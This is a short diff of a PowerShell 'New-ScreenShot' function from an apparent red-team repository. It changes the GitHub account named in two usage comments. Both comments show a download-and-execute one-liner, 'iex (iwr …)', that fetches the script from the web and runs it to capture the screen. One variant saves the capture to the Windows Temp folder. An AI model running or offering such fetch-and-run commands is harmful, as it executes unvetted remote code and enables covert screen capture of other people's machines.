@@ -1,9 +1,9 @@
 Function New-ScreenShot {
 #USAGE:
-# iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Path_Selection.ps1);New-ScreenShot -Full 
+# iex (iwr https://raw.githubusercontent.com/t3l3m3try/Red_Team/master/Discovery/Take_ScreenShot_Path_Selection.ps1);New-ScreenShot -Full 
 # --> Specify path manually 
 # OR
-# powershell.exe "iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Path_Selection.ps1);New-ScreenShot -Full -Path C:\Windows\Temp\ScreenShot.jpg"
+# powershell.exe "iex (iwr https://raw.githubusercontent.com/t3l3m3try/Red_Team/master/Discovery/Take_ScreenShot_Path_Selection.ps1);New-ScreenShot -Full -Path C:\Windows\Temp\ScreenShot.jpg"
 
 [cmdletbinding(SupportsShouldProcess=$True)]
 
